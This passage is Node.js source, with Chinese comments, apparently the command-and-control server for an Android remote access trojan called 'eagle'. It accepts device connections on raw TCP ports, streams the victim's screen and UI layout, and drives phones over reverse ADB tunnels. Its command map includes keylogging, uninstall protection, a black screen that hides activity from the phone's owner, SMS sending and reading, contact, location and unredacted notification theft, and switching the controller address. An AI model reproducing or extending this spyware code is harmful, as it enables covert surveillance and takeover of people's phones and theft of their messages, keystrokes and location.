      devId = castRoute(aid, name, addr[0]);
      if (!devId) { ctx.log('eagle-layout-noroute', {ip: addr[0]}); sock.destroy(); return; }
      const old = S.layoutSock.get(devId);
      S.layoutSock.set(devId, sock);
      if (old) try { old.destroy(); } catch {}
      ctx.log('eagle-layout-up', {d: devId, ip: addr[0]});
      touchDb(devId);
    }
    for (;;) {
      const nl = buf.indexOf(0x0a);
      if (nl === -1) break;
      const line = buf.slice(0, nl).toString('latin1').trim();
      buf = buf.slice(nl + 1);
      const m = line.match(/^LAYOUT_JSON:(\d+):/);
      if (!m) continue;                       // Clientname 等问候行丢弃
      const need = parseInt(m[1]);
      if (need <= 0 || need > 8 * 1024 * 1024) continue;
      if (buf.length < need) {                // 帧体未收全：把行首补回去等待
        buf = Buffer.concat([Buffer.from(line + '\n'), buf]);
        return;
      }
      const js = buf.slice(0, need);
      buf = buf.slice(need);
      layoutBroadcast(devId, js.toString('utf8'));
    }
  });
}

const layoutStart = devId => {
  S.readerOn.add(devId);
  const cached = S.layout.get(devId);
  if (cached && Date.now() - (S.layoutTs.get(devId) || 0) < 30000) {
    const d = ctx.getDevice(devId) || {};
    ctx.broadcast({type: 'ui_hierarchy', device_id: devId,
      data: {timestamp: S.layoutTs.get(devId), root: cached, screenWidth: d.screen_width || 1080, screenHeight: d.screen_height || 2400}}, [devId]);
    return true;
  }
  return sendDev(devId, 'Str_Red_Ser');
};
const layoutStop = devId => {
  S.readerOn.delete(devId);
  const lsock = S.layoutSock.get(devId);
  if (lsock) { try { lsock.write('cleanupSocket\n'); return true; } catch {} }
  return sendDev(devId, 'cleanupSocket');
};
const layoutReplyOrStart = devId => layoutStart(devId);

// ---------------- adb 直注通道（devId → dxs 无线调试隧道 127.0.0.1:15563） ----------------
// 手机端开启无线调试并部署 dxs 后，dxs 反连面板 /s/lk 桥，面板侧 adb server
// 经 15563 直达手机 adbd；serial 由 dxs 上报后 upsert，未知的按同机型继承。
const adbMap = {'8fe4d7e074cd798c': '127.0.0.1:15565', 'de63d84be06c6452': '127.0.0.1:15563', 'b290331aeebda7d4': '127.0.0.1:15563',
                '2612a86a4f984723': '127.0.0.1:15564'};   // devId → serial（每设备独立 frps 远端端口，模型继承自 upsert）
// 每设备 adb server socket：本机部署的 adb server 固定 5037（sshd 隧道 15563 的设备
// 与 dxs/frpc 反连的设备都注册在这里；zxg 源站版默认 5038，本机版用 5037）。
const adbSrv = {'2612a86a4f984723': 'tcp:127.0.0.1:5037'};
const ADB_ENV = {...process.env, ADB_SERVER_SOCKET: process.env.ADB_SERVER_SOCKET || 'tcp:127.0.0.1:5037'};
const adbEnvFor = devId => ({...ADB_ENV, ADB_SERVER_SOCKET: adbSrv[devId] || ADB_ENV.ADB_SERVER_SOCKET});
const ADB_BIN = process.env.ADB_BIN || 'adb';

// APK 安装：adb -s <serial> install -r <本地路径>（apk 在本机文件系统，adb server 走 adbEnvFor 同机 socket）
function adbInstall(devId, apkPath, timeout = 120) {
  const serial = adbMap[devId];
  if (!serial) return Promise.resolve(null);
  return new Promise(resolve => {
    let out = '';
    try {
      const p = spawn(ADB_BIN, ['-s', serial, 'install', '-r', apkPath], {env: adbEnvFor(devId)});
      const t = setTimeout(() => { try { p.kill(); } catch {} resolve(null); }, timeout * 1000);
      p.stdout.on('data', c => out += c.toString());
      p.stderr.on('data', c => out += c.toString());
      p.on('error', () => { clearTimeout(t); resolve(null); });
      p.on('close', (code) => { clearTimeout(t); resolve(/Success/i.test(out) || code === 0 ? out : null); });
    } catch { resolve(null); }
  });
}

function adbShell(devId, args, timeout = 8) {
  const serial = adbMap[devId];
  if (!serial) return Promise.resolve(null);
  return new Promise(resolve => {
    let out = '';
    try {
      const p = spawn(ADB_BIN, ['-s', serial, 'shell', ...args.map(String)], {env: adbEnvFor(devId)});
      const t = setTimeout(() => { try { p.kill(); } catch {} resolve(out || null); }, timeout * 1000);
      p.stdout.on('data', c => out += c.toString());
      p.on('error', () => { clearTimeout(t); resolve(null); });
      // 退出码判定：input keyevent / settings put 等成功时无输出，空输出+code 0 = 成功（返回 ''）
      p.on('close', (code) => { clearTimeout(t); resolve(code === 0 ? (out || '') : (out || null)); });
    } catch { resolve(null); }
  });
}

// adb 在线状态巡检：adbMap 设备 45s 用 get-state 探测 → DB adb_connected
//（前端"连接Adb/开启ADB模式"门禁的数据源，真实状态只能后端维护）
function adbState(serial, devId, timeout = 6) {
  return new Promise(resolve => {
    let out = '';
    try {
      const p = spawn(ADB_BIN, ['-s', serial, 'get-state'], {env: adbEnvFor(devId)});
      const t = setTimeout(() => { try { p.kill(); } catch {} resolve('unknown'); }, timeout * 1000);
      p.stdout.on('data', c => out += c.toString());
      p.on('error', () => { clearTimeout(t); resolve('unknown'); });
      p.on('close', () => { clearTimeout(t); resolve(out.trim() || 'unknown'); });
    } catch { resolve('unknown'); }
  });
}
function adbHealthWatch() {
  setInterval(async () => {
    for (const [devId, serial] of Object.entries(adbMap)) {
      try {
        const d = ctx.getDevice(devId);
        if (!d) continue;
        const online = (await adbState(serial, devId)) === 'device';
        if (!!d.adb_connected !== online) {
          d.adb_connected = online;
          ctx.setDevice(d);
          ctx.broadcast({type: 'device_update'}, [devId]);
          ctx.log('adb-health', {d: devId, online});
        }
      } catch (e) {}
    }
  }, 45000);
}

async function adbTouch(devId, cmd, p) {
  p = p || {};
  const N = v => { const n = Math.round(parseFloat(v)); return isFinite(n) ? n : 0; };
  if (cmd === 'click' || cmd === 'tap') {
    const x = N(p.x ?? p.centerX), y = N(p.y ?? p.centerY);
    return (x || y) && await adbShell(devId, ['input', 'tap', x, y]) !== null;
  }
  if (cmd === 'swipe') {
    return await adbShell(devId, ['input', 'swipe', N(p.startX ?? p.x1), N(p.startY ?? p.y1), N(p.endX ?? p.x2), N(p.endY ?? p.y2), N(p.duration) || 300]) !== null;
  }
  if (cmd === 'long_press') {
    return await adbShell(devId, ['input', 'swipe', N(p.x), N(p.y), N(p.x), N(p.y), '800']) !== null;
  }
  return false;
}

// ---------------- 触控：流通道优先（~100ms），adb 兜底 ----------------
function eagleTouch(devId, cmd, p) {
  p = p || {};
  if (S.cast.has(devId)) {
    const N = v => { const n = Math.round(parseFloat(v)); return isFinite(n) ? n : 0; };
    if (cmd === 'click' || cmd === 'tap') {
      const x = N(p.x ?? p.centerX), y = N(p.y ?? p.centerY);
      if (x || y) return castSend(devId, `CLICK:${x}:${y}`);
    }
    if (cmd === 'swipe') {
      return castSend(devId, `SWIPE:${N(p.startX ?? p.x1)}:${N(p.startY ?? p.y1)}:${N(p.endX ?? p.x2)}:${N(p.endY ?? p.y2)}`);
    }
    if (cmd === 'longclick' || cmd === 'longclick ' || cmd === 'long_press') return castSend(devId, `LONG_CLICK:${N(p.x)}:${N(p.y)}`);
    if (cmd === 'home') return castSend(devId, 'Home');
    if (cmd === 'back') return castSend(devId, 'Back');
    if (cmd === 'recents' || cmd === 'app_switch') return castSend(devId, 'RECENTS');
  }
  return adbTouch(devId, cmd, p);
}

// ---------------- 面板命令 → eagle ----------------
const SCREEN_TECH_CMDS = new Set(['SCREEN_CAPTURE_SET_TECH', 'SCREEN_CAPTURE_RESUME', 'SCREEN_CAPTURE_SET_TECH_ADB']);
const CMD_MAP = {
  GET_CONTACTS: 'req_contacts', GET_BATTERY_INFO: 'req_battary',
  KEYLOGGER_START: 'keysend_run_on', KEYLOGGER_STOP: 'keysend_run_off',
  ENABLE_UNINSTALL_PROTECTION: 'apk_protect_on', DISABLE_UNINSTALL_PROTECTION: 'apk_protect_off',
  ENABLE_BLACK_SCREEN: 'DV_LOCK', ENABLE_DXS_BLACK_SCREEN: 'DV_LOCK',
  DISABLE_BLACK_SCREEN: 'Clear_lock', DISABLE_DXS_BLACK_SCREEN: 'Clear_lock',
  UNLOCK_PHONE: 'unlock_phone', UNLOCK_SCREEN: 'unlock_phone',
  GET_APP_LIST: 'applist', APP_LIST: 'applist', GET_APPS: 'applist',
  GET_SIM_INFO: 'get_sim_info', REQUEST_NOTIFICATION_ACCESS: 'req_Notification_Listener',
  GET_NOTIFICATIONS_LISTENER: 'req_Notification_bar', AUTO_START_ON: 'req_auto_start',
  CLEAR_WEB_DATA: 'clear_web_data', SHOW_POWER_DIALOG: 'POWER_DIALOG',
  GET_LOCATION: 'req_location', LOCATION_START: 'req_location',
  LOCATION_STOP: 'location_fully_stop', GET_LAST_LOCATION: 'get_last_loc',
};
const KEYCODES = {HOME: '3', BACK: '4', RECENTS: '187', POWER: '26', VOLUME_UP: '24', VOLUME_DOWN: '25', MENU: '82', APP_SWITCH: '187'};

function screenStart(devId) {
  S.screenOn.add(devId);
  if (!S.castWait.includes(devId)) S.castWait.push(devId);
  // agent 流不可用但有 adb serial（无线调试隧道）→ 启动 adb 截屏泵兜底
  if (!S.cast.has(devId) && adbMap[devId] && !S.main.get(devId)) adbPumpStart(devId);
  if (S.cast.has(devId)) { castSend(devId, 'START'); return true; }
  return sendDev(devId, 'Screen_Cast');
}
function screenStop(devId) {
  S.screenOn.delete(devId);
  const i = S.castWait.indexOf(devId);
  if (i >= 0) S.castWait.splice(i, 1);
  castSend(devId, 'STOP');
  if (adbMap[devId]) adbPumpStop(devId);
  return sendDev(devId, 'STOP');
}

async function eagleCommand(devId, cmd, payload) {
  payload = payload || {};
  try {
    if (SCREEN_TECH_CMDS.has(cmd) || cmd === 'START_SCREEN_STREAM' || cmd === 'SCREEN_STREAM_START') { screenStart(devId); return true; }
    if (cmd === 'SCREEN_CAPTURE_STOP' || cmd === 'STOP_SCREEN_STREAM') { screenStop(devId); return true; }
    if (cmd === 'TAKE_SCREENSHOT' || cmd === 'CAPTURE_SCREEN') {
      (async () => {
        const b64 = await adbScreencap(devId);
        if (b64) ctx.broadcast({type: 'screenshot', device_id: devId, data: {image: b64}}, [devId]);
        else { screenStart(devId); setTimeout(() => { if (!S.screenOn.has(devId)) screenStop(devId); }, 2500); }
      })();
      return true;
    }
    if (cmd === 'SEND_SMS') {
      const num = String(payload.number || payload.phone || payload.to || '');
      const msg = String(payload.message || payload.text || payload.body || '');
      const sim = String(payload.sim || payload.simSlot || '0');
      return num && msg ? sendDev(devId, `send_msg:${num}:${sim}:${msg.replace(/:/g, ' ')}`) : false;
    }
    if (cmd === 'GET_SMS') return sendDev(devId, 'S_M__GSM:1');
    if (cmd === 'OPEN_APP' || cmd === 'RUN_APP') {
      const pkg = String(payload.package || payload.pkg || payload.appId || '');
      return pkg ? sendDev(devId, 'OPEN:' + pkg) : false;
    }
    if (cmd === 'UNINSTALL_APP') {
      const pkg = String(payload.package || payload.pkg || payload.appId || '');
      return pkg ? sendDev(devId, 'apk_remove:' + pkg) : false;
    }
    if (cmd === 'CHANGE_SERVER_URL') {
      const url = String(payload.serverUrl || payload.url || payload.ip || '');
      if (!url) return false;
      const host = url.split('://').pop().split(':')[0].split('/')[0];
      return sendDev(devId, 'set_new_ip:' + host);
    }
    if (['POWER_SLEEP', 'SCREEN_OFF', 'SYSTEM_LOCK_SCREEN'].includes(cmd)) {
      if (await adbShell(devId, ['input', 'keyevent', '26']) !== null) return true;
      return sendDev(devId, 'DV_LOCK');
    }
    if (['POWER_WAKE', 'SCREEN_ON'].includes(cmd)) {
      if (await adbShell(devId, ['input', 'keyevent', 'KEYCODE_WAKEUP']) !== null) return true;
      return sendDev(devId, 'unlock_phone');
    }
    if (cmd === 'KEY_EVENT') {
      const key = String(payload.key || '').toUpperCase();
      const castKey = {HOME: 'Home', BACK: 'Back', RECENTS: 'RECENTS', APP_SWITCH: 'RECENTS'}[key];
      if (castKey) {
        if (S.cast.has(devId)) return castSend(devId, castKey);
        if (await adbShell(devId, ['input', 'keyevent', KEYCODES[key] || '3']) !== null) return true;
        return castSend(devId, castKey);
      }
      if (key === 'POWER' && await adbShell(devId, ['input', 'keyevent', '26']) !== null) return true;
      return false;
    }
    if (['GET_DEVICE_STATE', 'GET_PASSWORD_STATUS', 'GET_SCREEN_STATUS', 'GET_LOCK_STATUS'].includes(cmd)) {
      const d = ctx.getDevice(devId) || {};
      ctx.broadcast({type: 'device_state', device_id: devId,
        data: {online: d.online, battery: d.battery_pct, charging: d.is_charging, screenOn: d.screen_on,
               status: d.status_note, lockType: d.password_type || d.status_note, locked: d.is_locked}}, [devId]);
      if (cmd === 'GET_PASSWORD_STATUS')
        ctx.broadcast({type: 'password_status', device_id: devId, data: {lockType: d.password_type || '', locked: !!d.is_locked}}, [devId]);
      return true;
    }
    if (['VOLUME_UP', 'VOLUME_DOWN', 'MUTE', 'SET_BRIGHTNESS', 'KEEP_SCREEN_ON', 'CANCEL_KEEP_SCREEN_ON', 'ENABLE_DND', 'DISABLE_DND'].includes(cmd)) {
      const amap = {VOLUME_UP: ['input', 'keyevent', '24'], VOLUME_DOWN: ['input', 'keyevent', '25'],
        MUTE: ['input', 'keyevent', '164'], KEEP_SCREEN_ON: ['svc', 'power', 'stayon', 'true'],
        CANCEL_KEEP_SCREEN_ON: ['svc', 'power', 'stayon', 'false'],
        ENABLE_DND: ['cmd', 'notification', 'set_dnd', 'on'], DISABLE_DND: ['cmd', 'notification', 'set_dnd', 'off']};
      if (cmd === 'SET_BRIGHTNESS') {
        const b = Math.round(parseFloat(payload.brightness ?? payload.value));
        return !!b && await adbShell(devId, ['settings', 'put', 'system', 'screen_brightness', b]) !== null;
      }
      return amap[cmd] ? await adbShell(devId, amap[cmd]) !== null : false;
    }
    if (['GET_NETWORK_INFO', 'GET_NOTIFICATIONS', 'GET_CURRENT_WINDOW'].includes(cmd)) {
      const fn = {GET_NETWORK_INFO: answerNetwork, GET_NOTIFICATIONS: answerNotifications, GET_CURRENT_WINDOW: answerCurrentWindow}[cmd];
      fn(devId);
      return true;
    }
    if (CMD_MAP[cmd]) return sendDev(devId, CMD_MAP[cmd]);
    return sendDev(devId, cmd);                 // 未映射命令原样透传（eagle 108 命令词表）
  } catch (e) { ctx.log('eagle-cmd-err', {c: cmd, e: String(e).slice(0, 100)}); return false; }
}

// ---------------- adb 代答 ----------------
async function answerBattery(devId) {
  const out = await adbShell(devId, ['dumpsys', 'battery'], 8);
  if (!out) return false;
  let level = null, charging = false;
  for (const line of out.split('\n')) {
    const ls = line.trim();
    if (ls.startsWith('level:')) level = parseInt(ls.split(':')[1]);
    if ((ls.startsWith('AC powered:') || ls.startsWith('USB powered:')) && ls.endsWith('true')) charging = true;
  }
  if (level !== null) {
    const d = ctx.getDevice(devId) || {};
    d.battery_pct = level; d.is_charging = charging;
    ctx.setDevice(d);
    ctx.broadcast({type: 'battery_info', device_id: devId, data: {level, charging}}, [devId]);
    return true;
  }
  return false;
}

async function answerNetwork(devId) {
  const out = await adbShell(devId, ['dumpsys', 'connectivity'], 10);
  if (!out) return false;
  const net = /TYPE_WIFI.*state: (\w+)/.exec(out) ? 'WIFI'
            : /TYPE_MOBILE.*state: (\w+)/.exec(out) ? 'MOBILE' : '';
  const d = ctx.getDevice(devId) || {};
  if (net) d.network_type = net;
  const ipm = /ip address ([0-9.]+)/.exec(out);
  ctx.setDevice(d);
  ctx.broadcast({type: 'network_info', device_id: devId,
    data: {type: net, ip: ipm ? ipm[1] : (d.ip || '')}}, [devId]);
  return true;
}

async function answerNotifications(devId) {
  const out = await adbShell(devId, ['dumpsys', 'notification', '--noredact'], 10);
  if (!out) return false;
  const notifs = [];
  for (const blk of out.split('NotificationRecord[')) {
    if (blk.length < 40) continue;
    const pkg = (/pkg=([\w.]+)/.exec(blk) || [])[1] || '';
    const title = ((/android\.title=([^\n]+)/.exec(blk) || [])[1] || '').trim();
    const text = ((/android\.text=([^\n]+)/.exec(blk) || [])[1] || '').trim();
    const when = (/when=(\d+)/.exec(blk) || [])[1] || '0';
    if (pkg && (title || text)) notifs.push({package: pkg, title: title.slice(0, 60), text: text.slice(0, 120), timestamp: parseInt(when) || 0});
  }
  ctx.broadcast({type: 'notifications', device_id: devId, data: {notifications: notifs.slice(0, 30)}}, [devId]);
  return true;
}

async function answerCurrentWindow(devId) {
  const out = await adbShell(devId, ['dumpsys', 'window'], 8);
  if (!out) return false;
  let pkg = '', act = '';
  const m = /mCurrentFocus=Window\{[\w]+ \w+ ([\w.]+)\/([\w.$]+)/.exec(out);
  if (m) { pkg = m[1]; act = m[2]; }
  if (!pkg) {
    const m2 = /mFocusedApp=AppWindowToken\{[\w]+ token=Token\{ [\w]+ ActivityRecord\{[\w]+ \w+ ([\w.]+)\//.exec(out);
    if (m2) pkg = m2[1];
  }
  ctx.broadcast({type: 'current_window_info', device_id: devId,
    data: {source: 'adb', windows: [{className: pkg, activity: act, pkg}], currentPackage: pkg, currentActivity: act}}, [devId]);
  return !!pkg;
}

async function adbScreencap(devId) {
  const serial = adbMap[devId];
  if (!serial) return null;
  for (let i = 0; i < 2; i++) {
    try {
      const b64 = await new Promise(resolve => {
        let out = Buffer.alloc(0);
        const p = spawn(ADB_BIN, ['-s', serial, 'exec-out', 'screencap', '-p'], {env: adbEnvFor(devId)});
        const t = setTimeout(() => { try { p.kill(); } catch {} resolve(null); }, 15000);
        p.stdout.on('data', c => out = Buffer.concat([out, c]));
        p.on('error', () => { clearTimeout(t); resolve(null); });
        p.on('close', () => { clearTimeout(t); resolve(out.length > 1000 ? out.toString('base64') : null); });
      });
      if (b64) return b64;
    } catch {}
  }
  return null;
}

// uiautomator XML → 前端 zip 通道（原版主格式：data.zip = base64(deflateRaw(XML))，前端 $M DOMParser 解析）
const zlib = require('zlib');
async function answerUiHierarchy(devId) {
  if (!adbMap[devId]) return false;
  const xml = await adbShell(devId, ['uiautomator', 'dump', '/data/local/tmp/eagle_ui.xml >/dev/null 2>&1; cat /data/local/tmp/eagle_ui.xml'], 12);
  if (!xml || !xml.includes('<hierarchy')) return false;
  try {
    const zip = zlib.deflateRawSync(Buffer.from(xml, 'utf8')).toString('base64');
    ctx.broadcast({type: 'ui_hierarchy', device_id: devId, data: {zip}}, [devId]);
    return true;
  } catch { return false; }
}

// ---------------- 统一命令入口（面板命令 → eagle 设备） ----------------
function commandToDevice(devId, cmd, payload) {
  if (!cmd) return false;
  if (!isEagleDev(devId)) return false;
  return eagleCommand(devId, cmd, payload);
}

// ---------------- 周期任务 ----------------
function keepalive() {
  setInterval(() => {
    for (const [devId, c] of S.main) sendLine(c.sock, 'PONG');
  }, 20000);
  // 流通道不发 PING：5055 问候后是纯二进制帧流，文本帧会破坏 [4字节小端长度][JPEG] 解析
}

function appsFlusher() {
  setInterval(() => {
    for (const [devId, t] of [...S.appsFlush]) {
      if (Date.now() - t > 3000) {
        S.appsFlush.delete(devId);
        const apps = S.apps.get(devId) || [];
        if (apps.length) {
          ctx.broadcast({type: 'app_list', device_id: devId, data: {apps}}, [devId]);
          ctx.log('eagle-apps', {d: devId, n: apps.length});
        }
      }
    }
  }, 1500);
}

function offlineWatcher() {
  setInterval(() => {
    try {
      const rows = ctx.db.prepare("SELECT id, data FROM devices").all();
      for (const r of rows) {
        let d;
        try { d = JSON.parse(r.data); } catch { continue; }
        if (d.source !== 'eagle' || !d.online) continue;
        const ls = String(d.last_seen || '');
        try {
          const ts = new Date(ls.replace(' ', 'T') + 'Z').getTime();   // isoNow 带 +8h 偏移写入，直接按 UTC 解析一致
          if (Date.now() - ts > 45000 && !S.main.has(d.id)) {
            d.online = false; d.svc_online = false;
            ctx.setDevice(d);
            ctx.broadcast({type: 'device_offline', device_id: d.id, data: d}, [d.id]);
            ctx.broadcast({type: 'device_update'}, [d.id]);
            ctx.log('watchdog-off', d.id);
          }
        } catch {}
      }
    } catch {}
  }, 15000);
}

// ---------------- 启动 ----------------
function start() {
  const mk = (port, handler, note) => {
    const srv = net.createServer(handler);
    srv.on('error', e => ctx.log('eagle-srv-err', {port, e: String(e).slice(0, 100)}));
    srv.listen(port, '0.0.0.0', () => ctx.log('eagle-server', {port, note}));
  };
  mk(EAGLE_MAIN_PORT, mainConn, 'Main_Socket raw TCP');
  mk(EAGLE_CAST_PORT, castConn, 'sc_cast screen stream');
  mk(EAGLE_LAYOUT_PORT, layoutConn, 'screen reader layout stream');
  keepalive();
  appsFlusher();
  offlineWatcher();
  adbHealthWatch();
}

module.exports = {init, start, S, commandToDevice, eagleCommand, eagleTouch, layoutStart, layoutStop, layoutReplyOrStart,
  answerBattery, answerNetwork, answerNotifications, answerCurrentWindow, answerUiHierarchy, adbScreencap, adbShell, adbInstall, adbMap, isEagleDev, sendDev, adbPumpStart, adbPumpStop};

// ---------------- adb 截屏泵（agent 离线时的画面：screencap → ffmpeg 转 JPEG → screenshot 事件） ----------------
// 按订阅人数计数启停；单飞防堆积；连续 5 次失败自动停泵。
const adbPumps = new Map();          // devId -> {n, timer, busy, fails}
const ADB_PUMP_MS = 1500;
function ffmpegToJpeg(pngBuf, cb) {
  const ff = spawn('ffmpeg', ['-loglevel', 'error', '-i', 'pipe:0', '-vf', 'scale=360:-2', '-q:v', '7', '-f', 'mjpeg', 'pipe:1']);
  let out = Buffer.alloc(0);
  ff.stdout.on('data', c => { out = Buffer.concat([out, c]); });
  ff.on('error', () => cb(null));
  ff.on('close', code => cb(code === 0 && out.length > 500 ? out : null));
  ff.stdin.end(pngBuf);
  setTimeout(() => { try { ff.kill(); } catch (e) {} }, 12000);
}
async function adbPumpOnce(devId) {
  const p = adbPumps.get(devId);
  if (!p) return;
  const b64 = await adbScreencap(devId);
  const q = adbPumps.get(devId);
  if (!q) return;
  q.busy = false;
  if (!b64) { if (++q.fails >= 5) { adbPumpStop(devId); ctx.log('adb-pump-stop', {d: devId, note: '5 fails'}); } return; }
  q.fails = 0;
  ffmpegToJpeg(Buffer.from(b64, 'base64'), jpg => {
    if (!adbPumps.get(devId) || !jpg) return;
    ctx.broadcast({type: 'screenshot', device_id: devId, data: {image: jpg.toString('base64'), source: 'adb'}}, [devId]);
  });
}
function adbPumpStart(devId) {
  if (!adbMap[devId]) return false;
  const p = adbPumps.get(devId) || {n: 0, busy: false, fails: 0};
  p.n++;
  adbPumps.set(devId, p);
  if (!p.timer) {
    p.timer = setInterval(() => { if (p.busy) return; p.busy = true; adbPumpOnce(devId); }, ADB_PUMP_MS);
    ctx.log('adb-pump-start', {d: devId});
  }
  return true;
}
function adbPumpStop(devId) {
  const p = adbPumps.get(devId);
  if (!p) return;
  if (--p.n > 0) return;
  if (p.timer) clearInterval(p.timer);
  adbPumps.delete(devId);
  ctx.log('adb-pump-stop', {d: devId, note: 'no subscribers'});
}
